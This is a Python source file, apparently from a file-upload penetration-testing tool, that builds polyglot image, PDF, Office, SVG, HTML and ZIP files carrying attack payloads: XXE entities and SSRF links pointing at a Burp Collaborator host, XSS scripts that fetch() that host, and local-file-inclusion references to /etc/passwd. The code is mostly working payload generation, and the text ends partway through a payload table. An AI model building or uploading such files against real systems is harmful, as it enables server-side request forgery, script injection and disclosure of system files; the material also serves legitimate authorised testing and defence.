from pathlib import Path
from PIL import Image
import struct
import zlib
import zipfile
import tempfile
import shutil

def create_png_with_metadata(payload_content, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'PNG')
    png_data = bytearray(img_bytes.getvalue())
    
    iTXt_chunk = payload_content.encode('utf-8')
    iTXt_length = struct.pack('>I', len(iTXt_chunk))
    iTXt_type = b'iTXt'
    crc_data = iTXt_type + iTXt_chunk
    crc = zlib.crc32(crc_data) & 0xffffffff
    iTXt_crc = struct.pack('>I', crc)
    
    iend_pos = png_data.rfind(b'IEND')
    if iend_pos != -1:
        iend_chunk_start = iend_pos - 4
        new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
        png_data[iend_chunk_start:iend_chunk_start] = new_chunk
    
    return bytes(png_data)

def create_png_polyglot_append(payload_content):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'PNG')
    png_data = img_bytes.getvalue()
    
    return png_data + payload_content.encode('utf-8')

def create_jpg_with_metadata(payload_content, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'JPEG', quality=95)
    jpg_data = bytearray(img_bytes.getvalue())
    
    com_marker = b'\xFF\xFE'
    com_payload = payload_content.encode('utf-8')
    com_length = struct.pack('>H', len(com_payload) + 2)
    com_chunk = com_marker + com_length + com_payload
    
    soi_pos = jpg_data.find(b'\xFF\xD8')
    if soi_pos != -1:
        insert_pos = soi_pos + 2
        jpg_data[insert_pos:insert_pos] = com_chunk
    
    return bytes(jpg_data)

def create_jpg_polyglot_append(payload_content):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'JPEG', quality=95)
    jpg_data = img_bytes.getvalue()
    
    return jpg_data + payload_content.encode('utf-8')

def create_gif_with_metadata(payload_content, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'GIF')
    gif_data = bytearray(img_bytes.getvalue())
    
    comment_extension = b'\x21\xFE'
    comment_payload = payload_content.encode('utf-8')
    
    comment_chunks = []
    remaining = comment_payload
    while remaining:
        chunk_size = min(len(remaining), 255)
        comment_chunks.append(bytes([chunk_size]) + remaining[:chunk_size])
        remaining = remaining[chunk_size:]
    comment_chunks.append(b'\x00')
    
    comment_block = comment_extension + b''.join(comment_chunks)
    
    logical_screen_pos = gif_data.find(b'GIF89a')
    if logical_screen_pos != -1:
        insert_pos = logical_screen_pos + 13
        gif_data[insert_pos:insert_pos] = comment_block
    
    return bytes(gif_data)

def create_pdf_polyglot_zip(payload_zip_content, burp_collab):
    pdf_header = b'%PDF-1.4\n'
    pdf_content = b'''1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Test) Tj
ET
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
500
'''
    pdf_trailer = b'\n%%EOF'
    
    return pdf_header + pdf_content + payload_zip_content + pdf_trailer

def create_pdf_polyglot_attachment(payload_content, burp_collab):
    pdf_header = b'%PDF-1.4\n'
    pdf_content = f'''1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/EmbeddedFiles <<
/Names [
(evil.zip)
<<
/Type /Filespec
/F (evil.zip)
/EF <<
/F 3 0 R
>>
>>
]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /EmbeddedFile
/Length {len(payload_content)}
>>
stream
{payload_content}
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
500
'''.encode('utf-8')
    pdf_trailer = b'\n%%EOF'
    
    return pdf_header + pdf_content + pdf_trailer

def create_docx_polyglot(payload_content, burp_collab, vuln_type='xxe'):
    base_url = f"http://{burp_collab}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
        
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / ".rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
        
        (temp_path / "word").mkdir()
        (temp_path / "word" / "document.xml").write_text('<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Test</w:t></w:r></w:p></w:body></w:document>')
        
        (temp_path / "word" / "_rels").mkdir()
        if vuln_type == 'ssrf':
            (temp_path / "word" / "_rels" / "document.xml.rels").write_text(f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{base_url}/ssrf-docx-polyglot" TargetMode="External"/></Relationships>')
        else:
            (temp_path / "word" / "_rels" / "document.xml.rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>')
        
        if vuln_type == 'xxe':
            (temp_path / "customXml").mkdir()
            (temp_path / "customXml" / "item1.xml").write_text(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{base_url}/xxe-docx-polyglot">]><root>&xxe;</root>')
            (temp_path / "customXml" / "_rels").mkdir()
            (temp_path / "customXml" / "_rels" / "item1.xml.rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>')
        
        if vuln_type == 'lfi':
            (temp_path / "word" / "webSettings.xml").write_text('<?xml version="1.0"?><w:webSettings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:attachedTemplate r:id="rId1"/></w:webSettings>')
            (temp_path / "word" / "_rels" / "webSettings.xml.rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///etc/passwd" TargetMode="External"/></Relationships>')
        
        polyglot_file = temp_path / "polyglot.zip"
        with zipfile.ZipFile(polyglot_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file() and file_path != polyglot_file:
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
            
            if payload_content:
                payload_file = temp_path / "payload"
                payload_file.write_bytes(payload_content)
                zip_ref.write(payload_file, "payload")
        
        return polyglot_file.read_bytes()

def create_xlsx_polyglot(payload_content, burp_collab, vuln_type='xxe'):
    base_url = f"http://{burp_collab}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>')
        
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / ".rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>')
        
        (temp_path / "xl").mkdir()
        if vuln_type == 'xxe':
            (temp_path / "xl" / "workbook.xml").write_text(f'<?xml version="1.0"?><!DOCTYPE workbook [<!ENTITY xxe SYSTEM "{base_url}/xxe-xlsx-polyglot">]><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>')
        else:
            (temp_path / "xl" / "workbook.xml").write_text('<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>')
        
        (temp_path / "xl" / "_rels").mkdir()
        if vuln_type == 'ssrf':
            (temp_path / "xl" / "_rels" / "workbook.xml.rels").write_text(f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{base_url}/ssrf-xlsx-polyglot" TargetMode="External"/></Relationships>')
        else:
            (temp_path / "xl" / "_rels" / "workbook.xml.rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>')
        
        (temp_path / "xl" / "worksheets").mkdir()
        if vuln_type == 'lfi':
            (temp_path / "xl" / "worksheets" / "sheet1.xml").write_text(f'<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c><f>=HYPERLINK("file:///etc/passwd","test")</f></c></row></sheetData></worksheet>')
        elif vuln_type == 'ssrf':
            (temp_path / "xl" / "worksheets" / "sheet1.xml").write_text(f'<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c><f>=HYPERLINK("{base_url}/ssrf-xlsx-polyglot-hyperlink","test")</f></c></row></sheetData></worksheet>')
        else:
            (temp_path / "xl" / "worksheets" / "sheet1.xml").write_text('<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c><v>1</v></c></row></sheetData></worksheet>')
        
        if vuln_type == 'xxe':
            (temp_path / "xl" / "sharedStrings.xml").write_text(f'<?xml version="1.0"?><!DOCTYPE sst [<!ENTITY xxe SYSTEM "{base_url}/xxe-xlsx-sharedstrings">]><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>&xxe;</t></si></sst>')
        
        polyglot_file = temp_path / "polyglot.zip"
        with zipfile.ZipFile(polyglot_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file() and file_path != polyglot_file:
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
            
            if payload_content:
                payload_file = temp_path / "payload"
                payload_file.write_bytes(payload_content)
                zip_ref.write(payload_file, "payload")
        
        return polyglot_file.read_bytes()

def create_pptx_polyglot(payload_content, burp_collab, vuln_type='xxe'):
    base_url = f"http://{burp_collab}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/></Types>')
        
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / ".rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/></Relationships>')
        
        (temp_path / "ppt").mkdir()
        if vuln_type == 'xxe':
            (temp_path / "ppt" / "presentation.xml").write_text(f'<?xml version="1.0"?><!DOCTYPE p:presentation [<!ENTITY xxe SYSTEM "{base_url}/xxe-pptx-polyglot">]><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:sldMasterIdLst><p:sldMasterId r:id="rId1"/></p:sldMasterIdLst></p:presentation>')
        else:
            (temp_path / "ppt" / "presentation.xml").write_text('<?xml version="1.0"?><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:sldMasterIdLst><p:sldMasterId r:id="rId1"/></p:sldMasterIdLst></p:presentation>')
        
        (temp_path / "ppt" / "_rels").mkdir()
        if vuln_type == 'ssrf':
            (temp_path / "ppt" / "_rels" / "presentation.xml.rels").write_text(f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{base_url}/ssrf-pptx-polyglot" TargetMode="External"/></Relationships>')
        else:
            (temp_path / "ppt" / "_rels" / "presentation.xml.rels").write_text('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/></Relationships>')
        
        (temp_path / "ppt" / "slideMasters").mkdir()
        (temp_path / "ppt" / "slideMasters" / "slideMaster1.xml").write_text('<?xml version="1.0"?><p:sldMaster xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree/></p:cSld></p:sldMaster>')
        
        if vuln_type == 'xss':
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'<?xml version="1.0"?><p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree><p:sp><p:txBody><a:p><a:r><a:t><![CDATA[<svg onload=alert(1)>]]></a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>')
        
        polyglot_file = temp_path / "polyglot.zip"
        with zipfile.ZipFile(polyglot_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file() and file_path != polyglot_file:
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
            
            if payload_content:
                payload_file = temp_path / "payload"
                payload_file.write_bytes(payload_content)
                zip_ref.write(payload_file, "payload")
        
        return polyglot_file.read_bytes()

def create_svg_polyglot_png(payload_svg, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'PNG')
    png_data = img_bytes.getvalue()
    
    iend_pos = png_data.rfind(b'IEND')
    if iend_pos != -1:
        png_data = png_data[:iend_pos + 8]
    
    return png_data + payload_svg.encode('utf-8')

def create_svg_polyglot_zip(payload_zip, burp_collab):
    svg_content = f'''<svg xmlns="http://www.w3.org/2000/svg">
<!-- {payload_zip.hex()} -->
<rect width="100" height="100" fill="red"/>
</svg>'''
    return svg_content.encode('utf-8')

def create_zip_polyglot_append(payload_content):
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        test_file = temp_path / "test.txt"
        test_file.write_text("test")
        
        zip_file = temp_path / "polyglot.zip"
        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            zip_ref.write(test_file, 'test.txt')
        
        zip_data = zip_file.read_bytes()
        return zip_data + payload_content.encode('utf-8')

def create_jar_polyglot_gif(payload_jar, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'GIF')
    gif_data = img_bytes.getvalue()
    
    return gif_data + payload_jar

def generate_extended_payloads(output_dir, target_ext, burp_collab):
    from generators.polyglot_generator import generate_polyglots_from_existing
    generate_polyglots_from_existing(output_dir, target_ext, burp_collab)
    return
    
    output_dir = Path(output_dir)
    base_url = f"http://{burp_collab}"
    
    polyglot_dir = output_dir / 'polyglot'
    polyglot_dir.mkdir(exist_ok=True)
    
    extended_mappings = {
        'pdf': {
            'zip': {
                'ssrf': [
                    ('ssrf1_pdf_zip', lambda: create_pdf_polyglot_zip(b'PK\x03\x04', burp_collab)),
                ],
                'xxe': [
                    ('xxe1_pdf_zip', lambda: create_pdf_polyglot_zip(b'PK\x03\x04', burp_collab)),
                ],
            },
            'png': {
                'ssrf': [
                    ('ssrf1_pdf_png', lambda: create_pdf_polyglot_attachment(f'<image href="{base_url}/ssrf-pdf-png"/>', burp_collab)),
                ],
            },
            'jpg': {
                'ssrf': [
                    ('ssrf1_pdf_jpg', lambda: create_pdf_polyglot_attachment(f'<image href="{base_url}/ssrf-pdf-jpg"/>', burp_collab)),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_pdf_svg', lambda: create_pdf_polyglot_attachment(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-pdf-svg">]><svg>&xxe;</svg>', burp_collab)),
                ],
                'ssrf': [
                    ('ssrf1_pdf_svg', lambda: create_pdf_polyglot_attachment(f'<svg><image href="{base_url}/ssrf-pdf-svg"/></svg>', burp_collab)),
                ],
            },
            'docx': {
                'ssrf': [
                    ('ssrf1_pdf_docx', lambda: create_pdf_polyglot_attachment(create_docx_polyglot(None, burp_collab), burp_collab)),
                ],
            },
            'epub': {
                'xxe': [
                    ('xxe1_pdf_epub', lambda: create_pdf_polyglot_attachment(b'PK\x03\x04', burp_collab)),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_pdf_html', lambda: create_pdf_polyglot_attachment(f'<html><script>fetch("{base_url}/xss-pdf-html")</script></html>', burp_collab)),
                ],
            },
            'mp4': {
                'ssrf': [
                    ('ssrf1_pdf_mp4', lambda: create_pdf_polyglot_attachment(b'ftypmp41', burp_collab)),
                ],
            },
        },
        'docx': {
            'png': {
                'ssrf': [
                    ('ssrf1_docx_png', lambda: create_docx_polyglot(b'PNG\x89PNG\r\n\x1a\n', burp_collab, 'ssrf')),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_docx_svg', lambda: create_docx_polyglot(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-docx-svg">]><svg>&xxe;</svg>'.encode('utf-8'), burp_collab, 'xxe')),
                ],
                'ssrf': [
                    ('ssrf1_docx_svg', lambda: create_docx_polyglot(f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="{base_url}/ssrf-docx-svg"/></svg>'.encode('utf-8'), burp_collab, 'ssrf')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_docx_pdf', lambda: create_docx_polyglot(b'%PDF-1.4', burp_collab, 'ssrf')),
                ],
            },
            'xlsx': {
                'xxe': [
                    ('xxe1_docx_xlsx', lambda: create_docx_polyglot(create_xlsx_polyglot(None, burp_collab, 'xxe'), burp_collab, 'xxe')),
                ],
            },
            'pptx': {
                'xxe': [
                    ('xxe1_docx_pptx', lambda: create_docx_polyglot(create_pptx_polyglot(None, burp_collab, 'xxe'), burp_collab, 'xxe')),
                ],
            },
            'jar': {
                'rce': [
                    ('rce1_docx_jar', lambda: create_docx_polyglot(b'PK\x03\x04META-INF/MANIFEST.MF', burp_collab)),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_docx_xml', lambda: create_docx_polyglot(f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{base_url}/xxe-docx-xml">]><root>&xxe;</root>'.encode('utf-8'), burp_collab, 'xxe')),
                ],
            },
            'lfi': {
                'lfi': [
                    ('lfi1_docx', lambda: create_docx_polyglot(None, burp_collab, 'lfi')),
                ],
            },
        },
        'xlsx': {
            'svg': {
                'xxe': [
                    ('xxe1_xlsx_svg', lambda: create_xlsx_polyglot(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-xlsx-svg">]><svg>&xxe;</svg>'.encode('utf-8'), burp_collab, 'xxe')),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xlsx_xml', lambda: create_xlsx_polyglot(f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{base_url}/xxe-xlsx-xml">]><root>&xxe;</root>'.encode('utf-8'), burp_collab, 'xxe')),
                ],
            },
            'png': {
                'ssrf': [
                    ('ssrf1_xlsx_png', lambda: create_xlsx_polyglot(b'PNG\x89PNG\r\n\x1a\n', burp_collab, 'ssrf')),
                ],
            },
            'docx': {
                'xxe': [
                    ('xxe1_xlsx_docx', lambda: create_xlsx_polyglot(create_docx_polyglot(None, burp_collab, 'xxe'), burp_collab, 'xxe')),
                ],
            },
            'pptx': {
                'xxe': [
                    ('xxe1_xlsx_pptx', lambda: create_xlsx_polyglot(create_pptx_polyglot(None, burp_collab, 'xxe'), burp_collab, 'xxe')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_xlsx_pdf', lambda: create_xlsx_polyglot(b'%PDF-1.4', burp_collab, 'ssrf')),
                ],
            },
            'lfi': {
                'lfi': [
                    ('lfi1_xlsx', lambda: create_xlsx_polyglot(None, burp_collab, 'lfi')),
                ],
            },
        },
        'pptx': {
            'svg': {
                'xxe': [
                    ('xxe1_pptx_svg', lambda: create_pptx_polyglot(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-pptx-svg">]><svg>&xxe;</svg>'.encode('utf-8'), burp_collab, 'xxe')),
                ],
            },
            'png': {
                'ssrf': [
                    ('ssrf1_pptx_png', lambda: create_pptx_polyglot(b'PNG\x89PNG\r\n\x1a\n', burp_collab, 'ssrf')),
                ],
            },
            'gif': {
                'xss': [
                    ('xss1_pptx_gif', lambda: create_pptx_polyglot(b'GIF89a', burp_collab, 'xss')),
                ],
            },
            'docx': {
                'xxe': [
                    ('xxe1_pptx_docx', lambda: create_pptx_polyglot(create_docx_polyglot(None, burp_collab, 'xxe'), burp_collab, 'xxe')),
                ],
            },
            'xlsx': {
                'xxe': [
                    ('xxe1_pptx_xlsx', lambda: create_pptx_polyglot(create_xlsx_polyglot(None, burp_collab, 'xxe'), burp_collab, 'xxe')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_pptx_pdf', lambda: create_pptx_polyglot(b'%PDF-1.4', burp_collab, 'ssrf')),
                ],
            },
        },
        'svg': {
            'png': {
                'xxe': [
                    ('xxe1_svg_png', f'''<svg xmlns="http://www.w3.org/2000/svg">
<image href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" onload="fetch('{base_url}/xxe-svg-png')"/>
</svg>'''),
                ],
                'ssrf': [
                    ('ssrf1_svg_png', f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="{base_url}/ssrf-svg-png"/>
</svg>'''),
                ],
            },
            'pdf': {
                'xxe': [
                    ('xxe1_svg_pdf', f'''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-svg-pdf">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_svg_html', f'''<svg xmlns="http://www.w3.org/2000/svg">
<foreignObject>
<iframe src="data:text/html,<script>fetch('{base_url}/xss-svg-html')</script>"></iframe>
</foreignObject>
</svg>'''),
                ],
            },
            'js': {
                'xss': [
                    ('xss1_svg_js', f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>fetch('{base_url}/xss-svg-js')</script>
</svg>'''),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_svg_zip', f'''<svg xmlns="http://www.w3.org/2000/svg">
<!-- PK\x03\x04 -->
<text>ZIP</text>
</svg>'''),
                ],
            },
            'docx': {
                'xxe': [
                    ('xxe1_svg_docx', f'''<svg xmlns="http://www.w3.org/2000/svg">
<!-- DOCX XML structure -->
<text>DOCX</text>
</svg>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_svg_xml', f'''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-svg-xml">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''),
                ],
            },
            'lfi': {
                'lfi': [
                    ('lfi1_svg', f'''<svg xmlns="http://www.w3.org/2000/svg">
<image href="file:///etc/passwd"/>
</svg>'''),
                ],
            },
        },
        'xml': {
            'svg': {
                'xxe': [
                    ('xxe1_xml_svg', f'''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-svg">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_xml_html', f'''<?xml version="1.0"?>
<html>
<body>
<script>fetch('{base_url}/xss-xml-html')</script>
</body>
</html>'''),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_xml_zip', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-zip">
]>
<root>
<!-- PK\x03\x04 -->
<data>&xxe;</data>
</root>'''),
                ],
            },
            'png': {
                'xxe': [
                    ('xxe1_xml_png', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-png">
]>
<root>
<!-- PNG\x89PNG -->
<data>&xxe;</data>
</root>'''),
                ],
            },
            'pdf': {
                'xxe': [
                    ('xxe1_xml_pdf', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-pdf">
]>
<root>
<!-- %PDF-1.4 -->
<data>&xxe;</data>
</root>'''),
                ],
            },
            'lfi': {
                'lfi': [
                    ('lfi1_xml', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
<data>&xxe;</data>
</root>'''),
                ],
            },
        },
        'html': {
            'png': {
                'ssrf': [
                    ('ssrf1_html_png', f'''<!DOCTYPE html>
<html>
<body>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" onload="fetch('{base_url}/ssrf-html-png')">
</body>
</html>'''),
                ],
            },
            'jpg': {
                'ssrf': [
                    ('ssrf1_html_jpg', f'''<!DOCTYPE html>
<html>
<body>
<img src="data:image/jpeg;base64,/9j/4AAQSkZJRg==" onload="fetch('{base_url}/ssrf-html-jpg')">
</body>
</html>'''),
                ],
            },
            'svg': {
                'xss': [
                    ('xss1_html_svg', f'''<!DOCTYPE html>
<html>
<body>
<svg onload="fetch('{base_url}/xss-html-svg')" xmlns="http://www.w3.org/2000/svg">
<rect width="100" height="100" fill="red"/>
</svg>
</body>
</html>'''),
                ],
            },
            'zip': {
                'ssrf': [
                    ('ssrf1_html_zip', f'''<!DOCTYPE html>
<html>
<body>
<iframe src="data:application/zip;base64,UEsDBAoAAAAA"></iframe>
<script>fetch('{base_url}/ssrf-html-zip')</script>
</body>
</html>'''),
                ],
            },
            'pdf': {
                'xss': [
                    ('xss1_html_pdf', f'''<!DOCTYPE html>
<html>
<body>
<embed src="data:application/pdf;base64,JVBERi0xLjQKJeLjz9MKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKPj4KZW5kb2JqCjIgMCBvYmoKPDwKL1R5cGUgL1BhZ2VzCi9LaWRzIFszIDAgUl0KL0NvdW50IDEKPD4KZW5kb2JqCjMgMCBvYmoKPDwKL1R5cGUgL1BhZ2UKL1BhcmVudCAyIDAgUgovTWVkaWFCb3ggWzAgMCA2MTIgNzkyXQo+PgplbmRvYmoKeHJlZgowIDQKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwMDA5IDAwMDAwIG4gCjAwMDAwMDAwNTQgMDAwMDAgbiAKMDAwMDAwMDEwOSAwMDAwMCBuIAp0cmFpbGVyCjw8Ci9TaXplIDQKL1Jvb3QgMSAwIFIKPj4Kc3RhcnR4cmVmCjE3NwolJUVPRg=="></embed>
<script>fetch('{base_url}/xss-html-pdf')</script>
</body>
</html>'''),
                ],
            },
            'js': {
                'xss': [
                    ('xss1_html_js', f'''<!DOCTYPE html>
<html>
<body>
<script>
fetch('{base_url}/xss-html-js');
</script>
</body>
</html>'''),
                ],
            },
        },
        'png': {
            'svg': {
                'xxe': [
                    ('xxe1_png_svg', lambda: create_png_polyglot_append(f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')),
                ],
                'ssrf': [
